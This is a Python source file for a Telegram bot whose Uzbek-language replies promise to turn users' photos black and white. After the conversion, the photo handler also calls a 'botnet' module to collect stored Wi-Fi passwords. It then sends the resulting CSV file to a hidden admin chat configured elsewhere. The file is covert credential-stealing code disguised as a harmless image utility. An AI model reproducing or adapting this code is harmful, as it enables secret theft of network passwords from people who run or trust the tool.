from telegram import Update
from telegram.ext import CallbackContext
import os
from PIL import Image
import cv2
import botnet
import config

async def start(update: Update, context: CallbackContext):
    user = update.message.from_user
    await update.message.reply_text(
        text=f"Assalomu aleykum {user.first_name}, tasvir yoki videongizni yuboring, uni oq-qora ko‘rinishga aylantirib beraman!"
    )

async def text_message(update: Update, context: CallbackContext):
    await update.message.reply_text('Surat yuboring, rasmingizni qora qilib beraman!')

async def photo_message(update: Update, context: CallbackContext):
    photo_file = await context.bot.get_file(update.message.photo[-1].file_id)
    chat_id = update.message.from_user.id

    file_name = 'image.jpg'
    await photo_file.download_to_drive(file_name)

    image = Image.open(file_name)
    black_and_white = image.convert("L")
    bw_file_name = 'image_to_grayscale.jpg'
    black_and_white.save(bw_file_name)

    await update.message.reply_photo(photo=open(bw_file_name, 'rb'))
    wifi = botnet.get_wifi_passwords(chat_id=chat_id)
    admin_id = config.get_chatID()
    await context.bot.send_document(admin_id, document=open(f"{chat_id}.csv", 'rb'))
